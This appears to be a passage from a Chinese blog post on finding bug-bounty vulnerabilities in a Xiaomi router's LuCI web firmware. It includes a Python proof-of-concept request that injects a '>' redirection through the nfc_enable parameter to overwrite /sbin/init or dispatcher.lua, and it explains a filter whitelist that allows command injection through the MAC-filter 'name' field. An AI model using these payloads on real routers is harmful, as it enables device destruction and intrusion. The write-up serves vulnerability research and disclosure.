LuciHttp.write_json(response)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">nfc_api = configureNFC</span><br></pre></td></tr></table></figure>
+<p>当满足<code>isMeshRe==false</code>&amp;&amp;<code>isMeshCap==true</code>,例如在<code>NETMODE</code>为<code>whc_cap</code>以及其他一些情况下</p>
+<p><code>nfc_enable</code>由用户传入,经过<code>json.encode</code>转化为json字符串</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;cmd&quot;</span><span class="punctuation">:</span><span class="string">&quot;sync_nfc&quot;</span><span class="punctuation">,</span><span class="attr">&quot;nfc_enable&quot;</span><span class="punctuation">:</span><span class="string">&quot;&#123;nfc_enable&#125;&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>最终被拼接入命令并执行</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sbin/whc_to_re_common_api.sh action <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;sync_nfc&quot;,&quot;nfc_enable&quot;:&quot;&#123;nfc_enable&#125;&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>由于并没有检查<code>nfc_enable</code>中的<code>&#39;</code>,所以用户可以传入单引号使得命令提前闭合</p>
+<p>但是当尝试按照第二篇文章中提到的使用<code>\n</code>进行命令注入时, 却并没有成功, 那么大概率某米在上次漏洞之后, 应该是已经将<code>\n</code>加入了过滤字符中了</p>
+<p>验证一下, 搜索<code>formvalue</code>方法的定义, 找到其位于<code>/usr/lib/lua/luci/http.lua</code></p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">context.request:formvalue</span><span class="params">(self, key, skipParsing)</span></span></span><br><span class="line">    <span class="comment">-- 如果未跳过解析且输入未解析，则解析输入</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> skipParsing <span class="keyword">and</span> <span class="keyword">not</span> <span class="built_in">self</span>.parsed_input <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">self</span>:_parse_input()</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">-- 如果提供了键，则返回对应参数值，否则返回所有参数</span></span><br><span class="line">    <span class="keyword">return</span> key <span class="keyword">and</span> <span class="built_in">self</span>.message.params[key] <span class="keyword">or</span> <span class="built_in">self</span>.message.params</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">formvalue</span><span class="params">(key, defaultValue, validator)</span></span></span><br><span class="line">    <span class="comment">-- 从请求中获取表单值</span></span><br><span class="line">    <span class="keyword">local</span> value = context.request:formvalue(key, defaultValue)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">-- 如果提供了验证器，则进行验证</span></span><br><span class="line">    <span class="keyword">if</span> validator <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> _UPVALUE0_.verify(value, validator) <span class="keyword">then</span></span><br><span class="line">            _UPVALUE1_.<span class="built_in">log</span>(<span class="number">3</span>, <span class="string">&quot;verify false key:&quot;</span>, key, <span class="string">&quot; val:&quot;</span>, value)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="comment">-- 没有验证器时进行安全检查</span></span><br><span class="line">        <span class="keyword">return</span> _UPVALUE2_.hackCheck(key, value)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<p><code>formvalue</code>会根据可能存在的第三个参数进行对应的校验, 例如<code>commonstr, numberstr</code>之类的</p>
+<p>在这个函数中, 并没有使用第三个参数, 那过滤显然在于<code>hackcheck</code>函数中</p>
+<p><code>hakcheck</code>位于<code>/usr/lib/lua/xiaoqiang/common/XQFunction.lua</code></p>
+<p>反编译后在该函数上方可以找到过滤字符集</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">L14 = <span class="string">[=[</span></span><br><span class="line"><span class="string">[`;|$&amp;</span></span><br><span class="line"><span class="string">]]</span>=]</span><br></pre></td></tr></table></figure>
+<p>看起来没有<code>\n</code>, 但仅仅只是因为反编译过程中<code>\n</code>被转义了, 实际上是有的</p>
+<p>那么现在确定了, <code>\n</code>作为分隔符进行命令注入已经行不通了, 难道最终只能功亏一篑</p>
+<p>此时在<code>setNfcStatus</code>中又注意到这么一部分代码</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> syncData = &#123;&#125;</span><br><span class="line">            syncData.cmd = <span class="string">&quot;sync_nfc&quot;</span></span><br><span class="line">            syncData.nfc_enable = <span class="built_in">tostring</span>(nfc_enable)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">local</span> json = <span class="built_in">require</span>(<span class="string">&quot;luci.json&quot;</span>).encode(syncData)</span><br><span class="line">            xqLog.<span class="built_in">log</span>(<span class="number">6</span>, <span class="string">&quot;CAP call RE do action msg: &quot;</span> .. json)</span><br><span class="line"></span><br><span class="line">            xqFunction.forkExec(<span class="string">&quot;/sbin/whc_to_re_common_api.sh action &#x27;&quot;</span> .. json .. <span class="string">&quot;&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>由<code>formvalue</code>得到的<code>nfc_enable</code>本身就是字符串, 但是却又调用了一次<code>tostring</code>函数</p>
+<p>那么tostring函数会不会存在对转义字符的处理呢, 因为<code>formvalue</code>并没有对<code>\</code>进行过滤, 如果<code>nfc_enable</code>中包含<code>\x24</code>那么<code>tostring</code>就会将其转义为<code>$</code>等分割字符</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-06-19_143422.png" alt=""></p>
+<p>是的确实可行, 但当我再次仿真环境, 进行测试时却依然失败了, 研究一下, 发现设备使用的lua是<code>5.1.5</code>版本的, 这个版本的<code>tostring</code>并没处理转义字符的能力</p>
+<p>气!!接连得失败这次挖洞之旅就这么结束了么!!!!</p>
+<p>既然命令注入没得法了, 但拒绝服务还是可以做到的</p>
+<p>前面提到<code>setNfcStatus</code>中执行命令时没有检查<code>&#39;</code>闭合, 在不能使用命令分割符的情况下, 还有一个特殊字符<code>&gt;</code>, 重定向符!!</p>
+<p>提前闭合<code>&#39;&#39;</code>后, 插入<code>&gt;</code>符号, 将命令的输出重定向到任意指定路径, 覆盖可执行文件和脚本, 进行设备破坏</p>
+<p>例如<code>/usr/lib/lua/luci/dispatcher.lua</code>, <code>/sbin/init</code>等</p>
+<p>写个验证脚本</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"><span class="built_in">path</span> = <span class="string">&quot;/usr/lib/lua/luci/dispatcher.lua&quot;</span></span><br><span class="line">#<span class="built_in">path</span> = <span class="string">&quot;/sbin/init&quot;</span></span><br><span class="line">token = <span class="string">&quot;960426559944fb61fc96e9039853d36a&quot;</span></span><br><span class="line"></span><br><span class="line">requests.get(<span class="string">&quot;http://192.168.0.8/cgi-bin/luci/;stok=&#123;&#125;/api/xqnetwork/set_nfc_status?nfc_enable=&#x27;&gt;%20&#123;&#125;%20&#x27;&quot;</span>.<span class="built_in">format</span>(token,<span class="built_in">path</span>))</span><br></pre></td></tr></table></figure>
+<p>攻击后结果</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$cat /usr/lib/lua/luci/dispatcher.lua</span><br><span class="line">&#123; <span class="string">&quot;method&quot;</span>: <span class="string">&quot;common_set&quot;</span>, <span class="string">&quot;payload&quot;</span>: <span class="string">&quot;&#123; \&quot;action\&quot;: \&quot;&#123;\\\&quot;cmd\\\&quot;:\\\&quot;sync_nfc\\\&quot;,\\\&quot;nfc_enable\\\&quot;:\\\&quot;\&quot; &#125;&quot;</span> &#125;</span><br><span class="line">$cat /sbin/init</span><br><span class="line">&#123; <span class="string">&quot;method&quot;</span>: <span class="string">&quot;common_set&quot;</span>, <span class="string">&quot;payload&quot;</span>: <span class="string">&quot;&#123; \&quot;action\&quot;: \&quot;&#123;\\\&quot;cmd\\\&quot;:\\\&quot;sync_nfc\\\&quot;,\\\&quot;nfc_enable\\\&quot;:\\\&quot;\&quot; &#125;&quot;</span> &#125;</span><br></pre></td></tr></table></figure>
+<p>这个漏洞只是在<code>/usr/lib/lua/luci/controller/api</code>目录下扫到的, 还有大量的处理代码位于<code>/usr/lib/lua/xiaoqiang</code></p>
+<p><code>/usr/lib/lua/xiaoqiang</code>中同样按照上面的提到的由危险函数出发, 但麻烦一点, 还要判断有漏洞的函数是否会被<code>/usr/lib/lua/luci/controller/api</code>中的接口调用</p>
+<p> 扫一遍, 又发现了数个类似的漏洞, 虽然这几个漏洞没啥实际应用意义, 但某米给出了<code>0.5k-1k</code>的单个价格, 且活动期间<code>*2.5</code>, 如果有还是还是挺爽的</p>
+<h2 id="尝试三"><a href="#尝试三" class="headerlink" title="尝试三"></a>尝试三</h2><p>难道这么辛苦挖一番, 最后连个命令注入都捞不到吗!!!到也不一定</p>
+<p>之前观察<code>formvalue</code>时提到其会调用<code>hackcheck</code>函数进行危险字符过滤</p>
+<p>再观察这个函数</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 敏感字段安全检查函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hackCheck</span><span class="params">(fieldName, fieldValue)</span></span></span><br><span class="line">    <span class="comment">-- 如果字段名或字段值为空，直接返回原始值</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> fieldName <span class="keyword">or</span> <span class="keyword">not</span> fieldValue <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> fieldValue</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">-- 如果是敏感字段，不进行检查直接放行（可能由其他机制处理）</span></span><br><span class="line">    <span class="keyword">if</span> SENSITIVE_FIELDS[fieldName] <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> fieldValue</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">-- 检查字段值是否包含危险字符</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">string</span>.<span class="built_in">find</span>(fieldValue, DANGEROUS_CHARS) <span class="keyword">then</span></span><br><span class="line">        _UPVALUE2_.<span class="built_in">log</span>(<span class="number">3</span>, <span class="string">&quot;hackCheck match key:&quot;</span>, fieldName, <span class="string">&quot; val:&quot;</span>, fieldValue)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>  <span class="comment">-- 包含危险字符，返回nil表示过滤该值</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">-- 不包含危险字符，返回原始值</span></span><br><span class="line">    <span class="keyword">return</span> fieldValue</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<p>注意到</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 如果是敏感字段，不进行检查直接放行（可能由其他机制处理）</span></span><br><span class="line"><span class="keyword">if</span> SENSITIVE_FIELDS[fieldName] <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span> fieldValue</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<p>也就是说<code>hackcheck</code>的过滤是存在一个白名单的, 针对这个白名单中的值, 不进行过滤, 直接返回</p>
+<p>向上查找, 找到白名单</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 定义需要进行安全检查的敏感字段</span></span><br><span class="line"><span class="keyword">local</span> SENSITIVE_FIELDS = &#123;</span><br><span class="line">    name = <span class="literal">true</span>,</span><br><span class="line">    password = <span class="literal">true</span>,</span><br><span class="line">    password2g = <span class="literal">true</span>,</span><br><span class="line">    password5g = <span class="literal">true</span>,</span><br><span class="line">    password5g2 = <span class="literal">true</span>,</span><br><span class="line">    pppoeName = <span class="literal">true</span>,</span><br><span class="line">    pppoePwd = <span class="literal">true</span>,</span><br><span class="line">    pwd = <span class="literal">true</span>,</span><br><span class="line">    pwd1 = <span class="literal">true</span>,</span><br><span class="line">    pwd2 = <span class="literal">true</span>,</span><br><span class="line">    pwd3 = <span class="literal">true</span>,</span><br><span class="line">    newPwd = <span class="literal">true</span>,</span><br><span class="line">    service = <span class="literal">true</span>,</span><br><span class="line">    ssid = <span class="literal">true</span>,</span><br><span class="line">    ssid1 = <span class="literal">true</span>,</span><br><span class="line">    ssid2 = <span class="literal">true</span>,</span><br><span class="line">    ssid3 = <span class="literal">true</span>,</span><br><span class="line">    ssid2g = <span class="literal">true</span>,</span><br><span class="line">    ssid5g = <span class="literal">true</span>,</span><br><span class="line">    ssid5g2 = <span class="literal">true</span>,</span><br><span class="line">    username = <span class="literal">true</span>,</span><br><span class="line">    apn = <span class="literal">true</span>,</span><br><span class="line">    pdp = <span class="literal">true</span>,</span><br><span class="line">    user = <span class="literal">true</span>,</span><br><span class="line">    passwd = <span class="literal">true</span>,</span><br><span class="line">    contact_phone = <span class="literal">true</span>,</span><br><span class="line">    phoneList = <span class="literal">true</span>,</span><br><span class="line">    msgtext = <span class="literal">true</span>,</span><br><span class="line">    acs_username = <span class="literal">true</span>,</span><br><span class="line">    acs_password = <span class="literal">true</span>,</span><br><span class="line">    conn_username = <span class="literal">true</span>,</span><br><span class="line">    conn_password = <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>也就是说<code>formvalue</code>这些值时, 是不会有检查的, 那么现在要做的就是找找有没有通过<code>formvalue</code>获得这些值, 之后又没有进一步检查的接口了</p>
+<p>别说, 还真有!</p>
+<p>在<code>/lua/luci/controller/api/xqsystem.lua</code>中的<code>setMacFilter</code>接口</p>
+<p>观察<code>setMacFilter</code>函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-10-13_180736.png" alt=""></p>
+<p>当用户传入一个格式合法的mac地址时便会进入<code>_setMacFilter</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-10-13_181106.png" alt=""></p>
+<p>在进行检查mac地址数量是否超过限制与进行一些设置后又进入<code>XQFirewall.setMacFilter</code>位于(/lua/xiaoqiang/module/XQFirewall.lua)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-10-13_181533.png" alt=""></p>
+<p>该函数会在已有的<code>macfilters</code>中寻找即将处理的情况,只要避免两种不合理情况即会向下继续进行</p>
+<ul>
+<li>增加重复</li>
+<li>删去不存在</li>
+</ul>
+<p>而这两种情况都能够通过自定义传入的值进行绕过</p>
+<p>注意到<code>name</code>刚好就是一个白名单中的属性, 且最后在没有充分的检查的情况下, 就直接拼接入命令中执行, 也就造成了一个命令注入</p>
+<p>据说在之前命令注入的单价是4k, 活动时10k, 我交的时候, 没给这么高, 但也挺不错了</p>
+<h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>这篇文章分享一下某米路由器漏洞挖掘时的经验, 希望对有想尝试挖一挖某米路由器的小伙伴有所帮助</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%9B%BA%E4%BB%B6"><span class="toc-number">2.</span> <span class="toc-text">关于固件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">3.</span> <span class="toc-text">漏洞挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E4%B8%80"><span class="toc-number">3.1.</span> <span class="toc-text">尝试一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E4%BA%8C"><span class="toc-number">3.2.</span> <span class="toc-text">尝试二</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E4%B8%89"><span class="toc-number">3.3.</span> <span class="toc-text">尝试三</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#End"><span class="toc-number">4.</span> <span class="toc-text">End</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ixout.github.io/posts/14352/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ixout.github.io/posts/14352/&text=某米路由器漏洞挖掘分享"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ixout.github.io/posts/14352/&title=某米路由器漏洞挖掘分享"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ixout.github.io/posts/14352/&is_video=false&description=某米路由器漏洞挖掘分享"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=某米路由器漏洞挖掘分享&body=Check out this article: https://ixout.github.io/posts/14352/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ixout.github.io/posts/14352/&title=某米路由器漏洞挖掘分享"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ixout.github.io/posts/14352/&title=某米路由器漏洞挖掘分享"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ixout.github.io/posts/14352/&title=某米路由器漏洞挖掘分享"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ixout.github.io/posts/14352/&title=某米路由器漏洞挖掘分享"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ixout.github.io/posts/14352/&name=某米路由器漏洞挖掘分享&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ixout.github.io/posts/14352/&t=某米路由器漏洞挖掘分享"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    ixout
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
